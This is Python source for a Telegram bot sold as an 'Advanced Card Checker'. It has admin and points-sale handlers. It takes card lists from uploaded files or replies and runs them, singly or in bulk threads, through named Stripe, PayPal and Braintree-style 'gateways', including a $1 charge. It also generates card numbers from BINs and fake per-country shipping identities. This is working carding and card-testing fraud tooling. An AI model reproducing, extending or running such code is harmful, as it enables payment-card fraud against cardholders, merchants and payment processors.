def ban_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        target_id = int(message.text.split()[1])
        if str(target_id) in users_data:
            users_data[str(target_id)]["banned"] = True
            save_users(users_data)
            bot.reply_to(message, f"✅ Banned user {target_id}")
            bot.send_message(target_id, "🚫 You have been banned from the bot")
    except:
        bot.reply_to(message, "❌ /ban <user_id>")

@bot.message_handler(commands=['unban'])
def unban_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        target_id = int(message.text.split()[1])
        if str(target_id) in users_data:
            users_data[str(target_id)]["banned"] = False
            save_users(users_data)
            bot.reply_to(message, f"✅ Unbanned user {target_id}")
            bot.send_message(target_id, "✅ You have been unbanned")
    except:
        bot.reply_to(message, "❌ /unban <user_id>")

@bot.message_handler(commands=['users'])
def users_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    users = load_users()
    if not users:
        bot.reply_to(message, "📊 No users")
        return
    msg = "📊 Users List\n━━━━━━━━━━━━━━━━\n"
    for uid, info in list(users.items())[:30]:
        name = info.get('name', '?')[:10]
        points = info.get('points', 0)
        banned = "🚫" if info.get('banned', False) else "✅"
        msg += f"• {uid} {banned} | {name} | ⭐{points}\n"
    msg += f"\n📊 Total: {len(users)}"
    bot.reply_to(message, msg)

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    users = load_users()
    total = len(users)
    banned = sum(1 for u in users.values() if u.get('banned', False))
    total_points = sum(u.get('points', 0) for u in users.values())
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    total_approved = sum(u.get('approved_checks', 0) for u in users.values())
    msg = f"""📊 Bot Statistics
━━━━━━━━━━━━━━━━
👥 Users: {total}
🚫 Banned: {banned}
⭐ Total Points: {total_points}
💳 Total Checks: {total_checks}
✅ Approved: {total_approved}
📈 Success Rate: {(total_approved/total_checks*100) if total_checks > 0 else 0:.1f}%"""
    bot.reply_to(message, msg)

@bot.message_handler(commands=['givecode'])
def givecode_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ Admin only")
        return
    try:
        parts = message.text.split()
        points = int(parts[1])
        max_uses = int(parts[2]) if len(parts) > 2 else 1
        if points <= 0:
            bot.reply_to(message, "⚠️ Points must be greater than 0")
            return
        code = create_code(points, max_uses)
        bot.reply_to(message, f"""✅ Code created!
━━━━━━━━━━━━━━━━
🔑 Code: {code}
⭐ Points: {points}
👥 Max uses: {max_uses}
━━━━━━━━━━━━━━━━
📌 Use: /redeem {code}""")
    except:
        bot.reply_to(message, "⚠️ /givecode <points> <max_uses>\nExample: /givecode 50 10")

@bot.message_handler(commands=['allpoints'])
def allpoints_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    users = load_users()
    if not users:
        bot.reply_to(message, "📊 No users")
        return
    msg = "📊 Users Points List\n━━━━━━━━━━━━━━━━\n"
    sorted_users = sorted(users.items(), key=lambda x: x[1].get('points', 0), reverse=True)
    for uid, info in sorted_users[:20]:
        name = info.get('name', '?')[:15]
        points = info.get('points', 0)
        banned = "🚫" if info.get('banned', False) else "✅"
        msg += f"• {uid} {banned} | {name} | ⭐{points}\n"
    msg += f"\n📊 Total: {len(users)} users"
    bot.reply_to(message, msg)

# ==================== معالج الملفات ====================
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned")
        return
    
    if not check_points(user_id):
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"temp_{user_id}_{int(time.time())}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
            cards = extract_cards_from_message('\n'.join(lines))
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file")
            os.remove(filename)
            return
        
        pending_mass_cards[user_id] = cards
        os.remove(filename)
        
        bot.reply_to(message, f"📁 Found {len(cards)} cards\n🗂️ Choose gateway:", reply_markup=get_mass_gateways_menu())
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['mass'])
def mass_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned")
        return
    
    if not check_points(user_id):
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "⚠️ Reply to a message containing cards")
        return
    
    cards = extract_cards_from_message(message.reply_to_message.text)
    if not cards:
        bot.reply_to(message, "❌ No valid cards found")
        return
    
    pending_mass_cards[user_id] = cards
    bot.reply_to(message, f"📊 Found {len(cards)} cards\n🗂️ Choose gateway:", reply_markup=get_mass_gateways_menu())

# ==================== دوال التوليد ====================
def process_single_bin(message):
    user_id = message.from_user.id
    bin_input = message.text.strip()
    if not bin_input or not bin_input[:6].isdigit():
        bot.reply_to(message, "❌ Please enter a valid BIN")
        return
    
    gen_states[user_id] = {'bin': bin_input, 'type': 'single'}
    keyboard = get_count_keyboard(bin_input, 'single')
    bot.reply_to(message, f"🎲 Choose number of cards for BIN {bin_input[:6]}:", reply_markup=keyboard)

def process_multi_bin(message):
    user_id = message.from_user.id
    bins_text = message.text.strip()
    bins = [b.strip() for b in bins_text.split('\n') if b.strip() and b[:6].isdigit()]
    if not bins:
        bot.reply_to(message, "❌ No valid BINs found")
        return
    
    bins_str = ','.join(bins[:5])
    gen_states[user_id] = {'bins': bins, 'type': 'multi'}
    keyboard = get_count_keyboard(bins_str, 'multi')
    bot.reply_to(message, f"📚 Choose cards per BIN ({len(bins)} BINs):", reply_markup=keyboard)

# ==================== معالج الأزرار ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    data = call.data
    
    # زر بدون وظيفة
    if data == "none":
        bot.answer_callback_query(call.id)
        return
    
    # ========== القائمة الرئيسية ==========
    if data == "back_main":
        msg_text = f"""━━━━━━━━━━━━━━━━━━━━━
🤖 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑
━━━━━━━━━━━━━━━━━━━━━
✨ Welcome {call.from_user.first_name} ✨

Choose from the menu below
━━━━━━━━━━━━━━━━━━━━━"""
        bot.edit_message_text(msg_text, user_id, call.message.message_id, reply_markup=main_menu(user_id))
        user_messages[user_id] = call.message.message_id
        bot.answer_callback_query(call.id)
        return
    
    if data == "check_menu":
        bot.edit_message_text("💳 Choose gateway:", user_id, call.message.message_id, reply_markup=get_check_menu())
        bot.answer_callback_query(call.id)
        return
    
    if data == "tools_menu":
        bot.edit_message_text("🛠 Choose tool:", user_id, call.message.message_id, reply_markup=get_tools_menu())
        bot.answer_callback_query(call.id)
        return
    
    if data == "buy_menu":
        bot.edit_message_text("💎 Buy Points:", user_id, call.message.message_id, reply_markup=get_buy_menu())
        bot.answer_callback_query(call.id)
        return
    
    if data == "info":
        plan, remaining = get_user_plan(user_id)
        msg = f"""📊 Bot Info
━━━━━━━━━━━━━━━━
🤖 Bot: Advanced Card Checker
👨‍💻 Dev: @S3s_A
📅 Version: 3.0
━━━━━━━━━━━━━━━━
⭐ Your Plan: {plan}
⏳ Remaining: {remaining}
━━━━━━━━━━━━━━━━
📌 Each check costs 1 point"""
        bot.edit_message_text(msg, user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="back_main")))
        bot.answer_callback_query(call.id)
        return
    
    if data == "points_menu":
        points = get_user_points(user_id)
        msg = f"⭐ Your balance: {points} points\n━━━━━━━━━━━━━━━━\n📌 Each check costs 1 point\n🎫 Use /redeem for code"
        bot.edit_message_text(msg, user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="tools_menu")))
        bot.answer_callback_query(call.id)
        return
    
    if data == "bin_menu":
        bot.edit_message_text("🔍 Send BIN\nExample: /bin 528445", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    if data == "fake_menu":
        bot.edit_message_text("🌍 Choose country:", user_id, call.message.message_id, reply_markup=get_fake_country_menu())
        bot.answer_callback_query(call.id)
        return
    
    if data == "gen_menu":
        bot.edit_message_text("🎲 Choose generation method:", user_id, call.message.message_id, reply_markup=get_gen_menu())
        bot.answer_callback_query(call.id)
        return
    
    if data == "gen_single":
        bot.edit_message_text("🎲 Send BIN (6-8 digits)", user_id, call.message.message_id)
        bot.register_next_step_handler(call.message, process_single_bin)
        bot.answer_callback_query(call.id)
        return
    
    if data == "gen_multi":
        bot.edit_message_text("📚 Send BINs (one per line)", user_id, call.message.message_id)
        bot.register_next_step_handler(call.message, process_multi_bin)
        bot.answer_callback_query(call.id)
        return
    
    if data == "file_menu":
        bot.edit_message_text("📁 Send a txt file containing cards", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    if data == "mass_menu":
        bot.edit_message_text("📊 Reply to a message with cards then /mass", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    if data == "register":
        register_user(user_id, call.from_user.username, call.from_user.first_name)
        points = get_user_points(user_id)
        msg = f"""✅ Registration successful!
━━━━━━━━━━━━━━━━
🆔 ID: {user_id}
👤 Username: @{call.from_user.username or 'None'}
⭐ Balance: {points} points
━━━━━━━━━━━━━━━━
Start using the buttons below"""
        bot.edit_message_text(msg, user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="back_main")))
        bot.answer_callback_query(call.id)
        return
    
    # ========== لوحة الأدمن ==========
    if data == "admin_panel":
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "⛔ Admin only", show_alert=True)
            return
        bot.edit_message_text("📊 Admin Panel", user_id, call.message.message_id, reply_markup=get_admin_panel())
        bot.answer_callback_query(call.id)
        return

    if data == "admin_stats":
        if user_id != ADMIN_ID:
            return
        users = load_users()
        total = len(users)
        banned = sum(1 for u in users.values() if u.get('banned', False))
        total_points = sum(u.get('points', 0) for u in users.values())
        msg = f"""📊 Statistics
━━━━━━━━━━━━━━━━
👥 Users: {total}
🚫 Banned: {banned}
⭐ Total Points: {total_points}"""
        bot.edit_message_text(msg, user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_users":
        if user_id != ADMIN_ID:
            return
        users = load_users()
        msg = "📋 Users List\n━━━━━━━━━━━━━━━━\n"
        for uid, info in list(users.items())[:20]:
            name = info.get('name', '?')[:10]
            points = info.get('points', 0)
            banned = "🚫" if info.get('banned', False) else "✅"
            msg += f"• {uid} {banned} | {name} | ⭐{points}\n"
        bot.edit_message_text(msg, user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_makecode":
        if user_id != ADMIN_ID:
            return
        bot.edit_message_text("🎫 Send: /makecode <points> <max_uses>\nExample: /makecode 50 10", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_addpoints":
        if user_id != ADMIN_ID:
            return
        bot.edit_message_text("➕ Send: /addpoints <user_id> <points>\nExample: /addpoints 123456789 50", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_ban":
        if user_id != ADMIN_ID:
            return
        bot.edit_message_text("🚫 Send: /ban <user_id>\nExample: /ban 123456789", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "admin_unban":
        if user_id != ADMIN_ID:
            return
        bot.edit_message_text("✅ Send: /unban <user_id>\nExample: /unban 123456789", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    # ========== توليد الفيزات بعدد محدد ==========
    if data.startswith("gen_count_"):
        parts = data.split('_')
        gen_type = parts[2]
        param = parts[3]
        count = int(parts[4])
        
        if gen_type == 'single':
            cards = generate_cards(param, count)
            gen_states[user_id] = {'cards': cards, 'type': 'single'}
            
            if count > 10:
                filename = f"generated_cards_{user_id}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write('\n'.join(cards))
                with open(filename, 'rb') as f:
                    bot.send_document(user_id, f, caption=f"🎴 Generated {len(cards)} cards (BIN: {param[:6]})")
                os.remove(filename)
                bot.answer_callback_query(call.id, f"✅ {len(cards)} cards saved to file!")
            else:
                cards_text = '\n'.join(cards)
                msg = f"🎴 Generated {len(cards)} cards:\n\n<code>{cards_text}</code>"
                keyboard = InlineKeyboardMarkup(row_width=2)
                keyboard.add(
                    InlineKeyboardButton("📋 Copy All", callback_data=f"copy_cards_{user_id}"),
                    InlineKeyboardButton("📁 Save as TXT", callback_data=f"save_cards_{user_id}")
                )
                keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="gen_menu"))
                bot.edit_message_text(msg, user_id, call.message.message_id, reply_markup=keyboard, parse_mode='HTML')
        
        elif gen_type == 'multi':
            bins = param.split(',')
            all_cards = []
            for b in bins[:5]:
                cards = generate_cards(b, count)
                all_cards.extend(cards)
            gen_states[user_id] = {'cards': all_cards, 'type': 'multi'}
            
            if count > 10 or len(all_cards) > 10:
                filename = f"generated_cards_{user_id}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write('\n'.join(all_cards))
                with open(filename, 'rb') as f:
                    bot.send_document(user_id, f, caption=f"🎴 Generated {len(all_cards)} cards from {len(bins)} BINs")
                os.remove(filename)
                bot.answer_callback_query(call.id, f"✅ {len(all_cards)} cards saved to file!")
            else:
                cards_text = '\n'.join(all_cards)
                msg = f"🎴 Generated {len(all_cards)} cards:\n\n<code>{cards_text}</code>"
                keyboard = InlineKeyboardMarkup(row_width=2)
                keyboard.add(
                    InlineKeyboardButton("📋 Copy All", callback_data=f"copy_cards_{user_id}"),
                    InlineKeyboardButton("📁 Save as TXT", callback_data=f"save_cards_{user_id}")
                )
                keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="gen_menu"))
                bot.edit_message_text(msg, user_id, call.message.message_id, reply_markup=keyboard, parse_mode='HTML')
        
        bot.answer_callback_query(call.id)
        return

    # ========== نسخ البطاقات ==========
    if data.startswith("copy_cards_"):
        target_user_id = int(data.replace("copy_cards_", ""))
        if target_user_id in gen_states:
            cards = gen_states[target_user_id]['cards']
            cards_text = '\n'.join(cards)
            bot.answer_callback_query(call.id, f"📋 {len(cards)} cards ready! Select and copy from below.", show_alert=True)
            bot.send_message(user_id, f"<code>{cards_text}</code>", parse_mode='HTML')
        return

    # ========== حفظ البطاقات في ملف ==========
    if data.startswith("save_cards_"):
        target_user_id = int(data.replace("save_cards_", ""))
        if target_user_id in gen_states:
            cards = gen_states[target_user_id]['cards']
            filename = f"generated_cards_{target_user_id}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(cards))
            with open(filename, 'rb') as f:
                bot.send_document(user_id, f, caption=f"🎴 Generated {len(cards)} cards")
            os.remove(filename)
            bot.answer_callback_query(call.id, "✅ File sent!")
        return
    
    # ========== بيانات الشحن ==========
    if data.startswith("fake_"):
        country = data.replace("fake_", "")
        info = generate_fake_info(country)
        bot.edit_message_text(info, user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="fake_menu")))
        bot.answer_callback_query(call.id)
        return
    
    # ========== شراء نقاط ==========
    if data.startswith("buy_"):
        points = data.replace("buy_", "")
        bot.edit_message_text(f"⭐ {points} points = Contact @S3s_A for the code", user_id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    # ========== الفحص الفردي من الأزرار ==========
    single_checks = {
        "check_str1": Stripe1,
        "check_str3": Stripe3,
        "check_chb": BraC,
        "check_live1": charge1usd,
        "check_pp1": check_paypal_gate1,
        "check_pp2": check_paypal_gate2,
        "check_rbe": stripe_donate_rbe
    }
    
    if data in single_checks:
        bot.edit_message_text("💳 Send card: number|month|year|cvv\nExample: 4111111111111111|12|25|123", user_id, call.message.message_id)
        bot.register_next_step_handler(call.message, lambda m: check_single_card(user_id, m.text.strip(), single_checks[data], data.replace("check_", ""), call.message.message_id))
        bot.answer_callback_query(call.id)
        return
    
    # ========== الفحص الجماعي ==========
    mass_gateways = {
        "mass_str1": Stripe1,
        "mass_str3": Stripe3,
        "mass_chb": BraC,
        "mass_live1": charge1usd,
        "mass_pp1": check_paypal_gate1,
        "mass_pp2": check_paypal_gate2,
        "mass_rbe": stripe_donate_rbe
    }
    
    if data in mass_gateways and user_id in pending_mass_cards:
        cards = pending_mass_cards[user_id]
        stop_key = f"{user_id}_{int(time.time())}"
        stop_check_flags[stop_key] = False
        current_checks[user_id] = stop_key
        gateway_name = data.replace("mass_", "")
        threading.Thread(target=check_mass_cards, args=(user_id, cards, mass_gateways[data], gateway_name, call.message.message_id, stop_key)).start()
        del pending_mass_cards[user_id]
        bot.answer_callback_query(call.id, f"✅ Checking {len(cards)} cards...")
        return
    
    # ========== إيقاف الفحص ==========
    if data.startswith("stop_"):
        stop_key = data.replace("stop_", "")
        if stop_key in stop_check_flags:
            stop_check_flags[stop_key] = True
            bot.answer_callback_query(call.id, "🛑 Stopping...")
        else:
            bot.answer_callback_query(call.id, "❌ No active check")
        return

# ==================== تشغيل البوت ====================
if __name__ == "__main__":
    print("✅ Bot is running...")
    print(f"👥 Users: {len(users_data)}")
    print("🚀 Starting polling...")
    bot.remove_webhook()
    time.sleep(2)
    bot.infinity_polling(skip_pending=True, timeout=20)